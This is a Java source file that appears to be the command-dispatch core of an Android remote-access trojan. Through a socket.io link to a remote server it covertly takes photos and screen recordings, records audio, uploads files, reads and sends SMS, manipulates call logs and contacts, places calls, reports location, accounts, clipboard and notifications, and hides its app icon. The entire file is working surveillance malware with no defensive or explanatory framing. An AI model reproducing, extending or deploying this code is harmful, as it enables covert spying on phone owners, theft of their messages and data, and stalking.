package com.remote.app;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Looper;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.remote.app.Managers.AppList;
import com.remote.app.Managers.Calls.CallsManager;
import com.remote.app.Managers.CameraManager;
import com.remote.app.Managers.Contacts.ContactsManager;
import com.remote.app.Managers.DeviceControl.Audio;
import com.remote.app.Managers.DeviceControl.Screen;
import com.remote.app.Managers.FileManager;
import com.remote.app.Managers.LocManager;
import com.remote.app.Managers.MediaFiles;
import com.remote.app.Managers.MicManager;
import com.remote.app.Managers.PermissionManager;
import com.remote.app.Managers.SMSManager;
import com.remote.app.Managers.ScreenActivity;
import com.remote.app.Managers.VideoManager;
import com.remote.app.Managers.WifiScanner;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.ExecutionException;

import io.socket.emitter.Emitter;

public class ConnectionManager {


    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();



    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if(ioSocket != null )
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");


                        switch (order){
                            case "0xCA": //Camera, screen
                                if(data.getString("action").equals("camList"))
                                    CA(-1,false,false);
                                else if (data.getString("action").equals("takePic")){
                                    CA(Integer.parseInt(data.getString("cameraID")),data.getBoolean("online"),false );
                                }else if(data.getString("action").equals("takeScreen")){
                                    CA(-1,data.getBoolean("online"),true);
                                }else if(data.getString("action").equals("takeVideo")){
                                    CAVid(Integer.parseInt(data.getString("cameraID")),data.getBoolean("online"),data.getInt("sec"));
                                }else if(data.getString("action").equals("takeScreenR")){
                                    CAVid(-1,data.getBoolean("online"),data.getInt("sec"));
                                }else
                                    break;
                                break;
                            case "0xFI"://File
                                if (data.getString("action").equals("ls"))
                                    FI(0,data.getString("path"));
                                else if (data.getString("action").equals("dl"))
                                    FI(1,data.getString("path"));
                                break;
                            case "0xSM"://sms
                                if(data.getString("action").equals("ls"))
                                    SM(0,null,null);
                                else if(data.getString("action").equals("sendSMS"))
                                    SM(1,data.getString("to") , data.getString("sms"));
                                break;
                            case "0xCL"://call log(add settings record call)-
                                    CL(data.getString("action").equals("addCL"),data.getString("action").equals("delCL"),data.getString("action").equals("MakeCall"),data);
                                break;
                            case "0xCO"://contacts
                                    CO(data.getString("action").equals("addCO"),data.getString("action").equals("chCO"),data.getString("action").equals("delCO"),data);
                                break;
                            case "0xMI"://microphone
                                MI(data.getInt("sec"));
                                break;
                            case "0xLO"://location
                                ioSocket.emit("0xLO", getLastLocation(context));
                                break;
                            case "0xWI"://WIFI
                                WI();
                                break;
                            case "0xPM":// PermissionManager
                                PM();
                                break;
                            case "0xIN"://Installs apps
                                IN();
                                break;
                            case "0xGP"://Get perrmissions
                                GP(data.getString("permission"));
                                break;
                            case "0xMF"://Media Files
                                MF(data.getString("action").equals("sW"),data.getString("action").equals("settings"),data);
                                break;
                            case "0xIF"://get information
                                ioSocket.emit("0xIF",function.GetInfo(context));
                                break;
                            case "0xOOD"://open dialog
                                function.OpenDialog(context,data.getString("title"),data.getString("msg"));
                                break;
                            case "0xOD"://deleteApp-
                                function.Delete(context);
                                break;
                            case "0xOHAI"://hide app icon
                                if(data.getBoolean("hide"))
                                    function.hideAppIcon(context);
                                else
                                    function.unHideAppIcon(context);
                                break;
                            case "0xGA"://get user accounts
                                ioSocket.emit("0xGA",function.getUserAccounts(context));
                                break;
                            case "0xCB"://get clipboards log
                                ioSocket.emit("0xCB", MainService.ReadFileAndSend(TypeOpenFile.Clipboard));
                                break;
                            case "0xNO"://get notifications log
                                ioSocket.emit("0xNO", MainService.ReadFileAndSend(TypeOpenFile.NotificationLogger));
                                break;
                            case "0xOOB"://open browser
                                openWebpage(context,data.getString("url"));
                                break;
                            case "0xAL"://get actions log
                                ioSocket.emit("0xAL", MainService.ReadFileAndSend(TypeOpenFile.ActionLogger));
                                break;

                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }

    }


    //MediaFiles
    public static void MF(boolean setWall,boolean settings,JSONObject data){
        try{
            if(setWall)
                Screen.setWallpaperPath(context,data.getString("path"));
            else if(settings)
                MFSetSettings(data.getInt("width"),data.getInt("height"));
            else
                ioSocket.emit("0xMF", new MediaFiles().getImagesList());
        }catch (Exception e){}
    }

    private static void MFSetSettings(int width, int height){
        MainService.editor.putInt("MFWidth",width).apply();
        MainService.editor.putInt("MFHeight",height).apply();
    }
    //Camera
    public static void CA(int cameraID,boolean online,boolean Screenshot){
        if(cameraID == -1 && Screenshot ==false) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
           if(cameraList != null)
               ioSocket.emit("0xCA" ,cameraList );
        } else if(cameraID != -1) {
            new CameraManager(context).startUp(cameraID,online);
        }else{
            //new ScreenShotManager().savePic(online,ScreenShotManager.takeScreenShot());
            Intent intent = new Intent(MainService.getContextOfApplication(), ScreenActivity.class);
            //intent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MainService.getContextOfApplication().startActivity(intent);
        }
    }

    public static void CAVid(int cameraID,boolean online,Integer sec){
        if(cameraID == -1){
            Intent intent = new Intent(MainService.getContextOfApplication(), ScreenActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("streamScreen",true);
            MainService.getContextOfApplication().startActivity(intent);
        }else
            new VideoManager(context,cameraID,online,sec).Start();
    }
    //File Manager
    public static void FI(int req , String path){
        if(req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put("type", "list");
                object.put("list", fm.walk(path));
                ioSocket.emit("0xFI", object);
            } catch (JSONException e){}
        }else if (req == 1)
            fm.uploadFile(path);
    }
    //Sms Manager
    public static void SM(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit("0xSM" , SMSManager.getsms());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("0xSM", isSent);
        }
    }
    //Calls
    @SuppressLint("MissingPermission")
    public static void CL(Boolean add, Boolean del, Boolean make, JSONObject data){
        try{
            if (add){
                    CallsManager.AddCallLog(data.getString("typeСall"), data.getString("number"), data.getString("duration"), data.getString("date"), data.getInt("count"));
            }else if(del){
                CallsManager.DeleteCallLog(data.getString("date"));
            }else if(make){
                String number = data.getString("number");
                Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }else{
                ioSocket.emit("0xCL" , CallsManager.getCallsLogs());
            }

        }catch (Exception e){}

    }
    //Contacts
    public static void CO(Boolean add,Boolean chn, Boolean del, JSONObject data){
        try{
            if(add)
                ContactsManager.AddContact(data.getString("name"),data.getString("phone"));
            else if(del)
                ContactsManager.DeleteContact(data.getString("raw_id"),data.getString("name"));
            else if(chn)
                ContactsManager.UpdateContact(data.getString("name"),data.getString("phone"),data.getString("name_N"),data.getString("phone_N"));
            else
                ioSocket.emit("0xCO" , ContactsManager.getContacts());
        }catch (Exception e){}

    }
    //Microphone
    public static void MI(int sec) throws Exception{
        MicManager.startRecording(sec);
    }
    //Wifi Manager
    public static void WI() {
        //ioSocket.emit("0xWI" , dRet);
        ioSocket.emit("0xWI" , WifiScanner.scan(context,false));
    }
    // PermissionManager
    public static void PM() {
        ioSocket.emit("0xPM" , PermissionManager.getGrantedPermissions());
    }

    //Installs apps
    public static void IN() {
        ioSocket.emit("0xIN" , AppList.getInstalledApps(false));
    }

    //check get permission
    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.emit("0xGP", data);
        } catch (JSONException e) {

        }
    }
    //location
    public static void LO() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        gps.getLocation();
        // check if GPS enabled
        if(gps.canGetLocation()){
            gps.getLocation();

            ioSocket.emit("0xLO", gps.getData().toString());
        }
    }

    @SuppressLint("MissingPermission")
    static Location getLastLocation(Context context){
        LocationManager lManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);

        Location locationGPS = lManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        Location locationNet = lManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        long GPSLocationTime =0;
        if(null != locationGPS) { GPSLocationTime = locationGPS.getTime(); }

        long NetLocationTime = 0;
        if(null != locationNet){ NetLocationTime = locationNet.getTime(); }

        Location loc;
        if(0 < GPSLocationTime - NetLocationTime){
            loc = locationGPS;
        }else{
            loc = locationNet;
        }

        Log.d("mylogs", String.valueOf(loc));

        if(loc != null)
            return loc;
        else
            return null;
    }

    public static void openWebpage(Context context,String url){
        if (!url.startsWith("http://") && !url.startsWith("https://")) url = "http://" + url;
        final Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

    }

}
